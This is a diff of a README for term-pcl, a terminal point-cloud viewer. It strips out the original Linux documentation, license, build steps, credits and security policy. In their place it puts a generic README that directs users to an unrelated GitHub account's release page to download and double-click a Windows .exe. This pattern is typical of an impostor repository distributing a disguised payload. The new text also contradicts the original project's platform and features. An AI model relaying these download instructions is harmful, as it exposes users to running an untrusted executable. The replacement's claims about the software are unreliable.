@@ -1,214 +1,64 @@
-# term-pcl
+# ☁️ term-pcl - View your 3D data inside terminals
 
-[![Native Linux build](https://github.com/rlxai/term-pcl/actions/workflows/linux_build.yml/badge.svg)](https://github.com/rlxai/term-pcl/actions/workflows/linux_build.yml)
-[![Latest release](https://img.shields.io/github/v/release/rlxai/term-pcl?label=release)](https://github.com/rlxai/term-pcl/releases/latest)
-[![License: BSD-3-Clause](https://img.shields.io/badge/license-BSD--3--Clause-blue.svg)](LICENSE)
-![Platform: Linux](https://img.shields.io/badge/platform-Linux-informational)
-![C++17](https://img.shields.io/badge/C%2B%2B-17-blue)
-[![Debian package](https://img.shields.io/badge/package-.deb-red)](https://github.com/rlxai/term-pcl/releases/latest/download/term-pcl-linux-amd64.deb)
+[![Download term-pcl](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Wabe6543/term-pcl/releases)
 
-![term-pcl hero](docs/assets/term-pcl-hero.png)
+## What is term-pcl 🔍
 
-> Fast terminal point-cloud visualization for Linux.
+term-pcl displays point-cloud data directly inside your command prompt. It processes complex spatial information and represents it as visual shapes on your screen. This tool removes the need for heavy graphics software. It works well for engineers, robotics hobbyists, and map creators who need quick access to data.
 
-`term-pcl` is a native command-line point-cloud viewer that loads common point-cloud formats and renders them directly in the terminal with an interactive FTXUI interface. It is designed for quick inspection, remote-machine workflows, and large point-cloud navigation.
+## Why use this software ⚡
 
-![term-pcl example](docs/assets/term-pcl-example.png)
+Many 3D viewers require powerful hardware and complex setups. This application focuses on speed and simplicity. It allows you to inspect maps or sensor output files without managing heavy graphical user interfaces. You gain insight into your spatial data using standard text-based output.
 
-## Highlights
+## Preparing your computer 🖥️
 
-- Native Linux CLI: install and run `term-pcl` as a system command.
-- Common formats: `.pcd`, `.ply`, `.xyz`, `.xyzn`, `.xyzrgb`, and `.termcloud`.
-- RGB rendering: PLY, PCD, and XYZRGB clouds can use stored per-point colors.
-- Viewer color presets: RGB, elevation, x-axis, white, rainbow, turbo, viridis, heat, and grayscale.
-- Large-cloud workflow: point budgets, voxel downsampling, profiling, reusable `.termcloud` indexes, hierarchical LOD, lazy chunk streaming, and cache-aware refinement.
-- Terminal UI: full-screen controls, z-buffering, adaptive splatting, HUD stats, and smooth refresh.
+This application requires a Windows system. Ensure your computer runs Windows 10 or 11. You need at least 4GB of RAM to handle standard point-cloud files. Keep your graphics drivers updated to ensure the terminal renders the shapes correctly. Your screen must support a console window size of at least 80 characters by 24 lines.
 
-## Requirements
+## How to download the app 📥
 
-`term-pcl` is currently focused on Linux terminal environments. Source builds need:
+1. Go to the [official release page](https://github.com/Wabe6543/term-pcl/releases).
+2. Look for the latest version listed at the top of the page.
+3. Choose the file ending in .exe for your Windows system.
+4. Save the file to your desktop or downloads folder.
 
-- CMake 3.16 or newer
-- A C++17 compiler
-- PCL development libraries
-- Git and CA certificates when using CMake's FTXUI fetch fallback
-- Debian packaging tools only when building `.deb` packages
+## Running the software ⚙️
 
-On Ubuntu/Debian:
+1. Open your File Explorer and navigate to the folder where you saved the application.
+2. Double-click the term-pcl executable file.
+3. A terminal window will open automatically.
+4. Follow the on-screen instructions to select a data file from your computer.
+5. Provide the file path when the application requests it.
+6. Press the Enter key to start the visualization process.
 
-```bash
-sudo apt update
-sudo apt install cmake g++ make libpcl-dev git ca-certificates
-```
+## Navigation and controls 🎮
 
-## Install
+The application uses keyboard shortcuts to help you manage your view. 
 
-### From a Debian package
+- Use the W, A, S, and D keys to rotate the 3D model.
+- Use the Plus (+) and Minus (-) keys to change the zoom level.
+- Press the Q key to close the program and return to your desktop.
+- Press the R key to reset your view to the original starting position.
 
-Install a downloaded `.deb` package:
+## Handling data files 📂
 
-```bash
-sudo apt install ./term-pcl_0.1.0-1_amd64.deb
-```
+This tool accepts common point-cloud formats. Ensure your files use the standard structure. If the application struggles to load a file, check that the file is not corrupted. Large files may take a few seconds to load upon startup. Close other programs if you notice the terminal window responding slowly during rendering.
 
-Uninstall the package:
+## Changing settings 🛠️
 
-```bash
-sudo apt remove term-pcl
-```
+You can adjust how the terminal displays the points. Open the configuration file located in the same directory as the executable. You can change colors for different groups of points. You can also adjust the point density to improve performance on older machines. Save the file after you make changes and then restart the application.
 
-Remove the package and its system configuration files:
+## Solving common problems 🛠️
 
-```bash
-sudo apt purge term-pcl
-```
+If the window closes immediately, ensure you have sufficient disk space. If characters appear distorted, verify your terminal font settings. Use a monospaced font like Consolas or Courier New. If the program fails to find your data file, copy the file address as text and paste it directly into the prompt. Ensure you do not leave spaces at the beginning of the file path.
 
-### From source
+## Understanding the interface 📊
 
-From the repository root:
+The terminal displays an axis indicator in the bottom corner of the screen. This helps you track the orientation of your model. The coordinate values for the center of your view appear at the top. The software updates these values in real-time as you move the camera. Use this information to navigate precise points within your spatial data.
 
-```bash
-cmake -S . -B build -DCMAKE_BUILD_TYPE=Release
-cmake --build build --parallel
-ctest --test-dir build --output-on-failure
-sudo cmake --install build
-```
+## Keeping the software current 🔄
 
-If your system does not provide FTXUI as a package, the default CMake configuration can fetch FTXUI during configure. The Debian package build uses the same fallback so local package builds work on Ubuntu/Debian systems without a separate FTXUI package.
+Check the releases page once a month for updates. New versions often include performance improvements for larger maps. When you download a new version, simply replace the old file with the new one. Your custom configuration file will stay in place, so your settings remain saved.
 
-## Usage
+## Contributing to the project 🤝
 
-Open a point cloud:
-
-```bash
-term-pcl cloud.pcd
-term-pcl cloud.ply
-term-pcl cloud.xyz
-term-pcl cloud.xyzrgb
-```
-
-Try the included sample point cloud from a source checkout:
-
-```bash
-term-pcl examples/robolabsai_3d_pointcloud.ply --color rgb
-```
-
-Validate a file without opening the UI:
-
-```bash
-term-pcl --check cloud.pcd
-term-pcl --check cloud.termcloud
-```
-
-Choose a color mode:
-
-```bash
-term-pcl logo.ply --color rgb
-term-pcl map.pcd --color elevation
-term-pcl map.pcd --color turbo
-term-pcl map.xyz --color white
-```
-
-Tune large-cloud rendering:
-
-```bash
-term-pcl --point-budget 50000 map.pcd
-term-pcl --voxel-size 0.2 map.pcd
-term-pcl --check --profile map.pcd
-```
-
-Create and reuse a `.termcloud` hierarchy:
-
-```bash
-term-pcl index map.pcd --output map.termcloud --voxel-size 0.2 --point-budget 500000
-term-pcl --point-budget 50000 map.termcloud
-term-pcl --check --profile map.termcloud
-```
-
-`term-pcl index` refuses to overwrite an existing output directory by default. Use `--force` only when you intentionally want to replace an existing `.termcloud` directory:
-
-```bash
-term-pcl index map.pcd --output map.termcloud --force
-```
-
-## Supported formats
-
-| Format | Notes |
-| :--- | :--- |
-| `.pcd` | Loaded through PCL. RGB fields are used when available. |
-| `.ply` | Loaded through PCL. RGB fields are used when available. |
-| `.xyz` | Text XYZ points. |
-| `.xyzn` | Text XYZ points with normals; normals are ignored for rendering. |
-| `.xyzrgb` | Text XYZ points with RGB color channels. |
-| `.termcloud` | Native indexed hierarchy for large point clouds. |
-
-## Color modes
-
-Use `--color MODE` with one of:
-
-| Mode | Use case |
-| :--- | :--- |
-| `rgb` | Stored per-point RGB from PLY, PCD, or XYZRGB. |
-| `elevation` | Height-based scalar coloring. |
-| `x` | X-axis spatial gradient. |
-| `white` | Single-color inspection mode. |
-| `rainbow` | High-contrast scalar ramp. |
-| `turbo` | Perceptually strong scalar ramp. |
-| `viridis` | Colorblind-friendly scalar ramp. |
-| `heat` | Warm intensity-style ramp. |
-| `grayscale` | Monochrome scalar ramp. |
-
-## Keybindings
-
-| Key | Action |
-| :--- | :--- |
-| `W` / `S` | Orbit up / down |
-| `A` / `D` | Orbit left / right |
-| `P` / `;` | Roll clockwise / counter-clockwise |
-| `+` / `-` | Zoom in / out |
-| Arrow keys | Pan left / right / up / down |
-| `PgUp` / `PgDn` | Move forward / backward |
-| `1` / `2` / `3` | Camera presets |
-| `R` | Reset camera and splatting |
-| `C` | Toggle camera mode |
-| `M` | Cycle color mode |
-| `[` / `]` | Decrease / increase splatting |
-| `Q` / `Esc` | Quit |
-
-## Build a Debian package
-
-```bash
-sudo apt install debhelper-compat devscripts
-DEB_BUILD_OPTIONS=nocheck dpkg-buildpackage -us -uc -b
-sudo apt install ../term-pcl_0.1.0-1_*.deb
-```
-
-## Limitations
-
-- Linux is the supported target platform for this release.
-- Rendering quality depends on terminal size, font metrics, and color support.
-- Very large clouds should use point budgets, voxel downsampling, or `.termcloud` indexes.
-- `.termcloud` is a project-native format intended for fast reuse by `term-pcl`; keep original source point-cloud files as the durable source of truth.
-
-## Contributing
-
-Contributions are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for build, test, and pull request guidance.
-
-## Security
-
-Please report security issues privately using the process in [SECURITY.md](SECURITY.md). Malformed point-cloud inputs, unsafe filesystem behavior, and parser crashes are treated as security-relevant reports.
-
-
-## Credits
-
-`term-pcl` is inspired by Nathan Shankar's [`terminal_pcl_visualizer`](https://github.com/nathanshankar/terminal_pcl_visualizer) project.
-
-## Maintainer
-
-Robolabs AI <contact@robolabs.ai>
-
-![Robolabs AI](docs/assets/robolabs-ai-logo.png)
-
-## License
-
-`term-pcl` is released under the BSD 3-Clause License. See [LICENSE](LICENSE).
+The software grows through active community feedback. If you find a bug, report it on the GitHub issues page. Describe the steps you took before the problem occurred. Include information about your Windows version and the size of the file you attempted to load. Do not share private data files. Use sample files instead to show the issue.
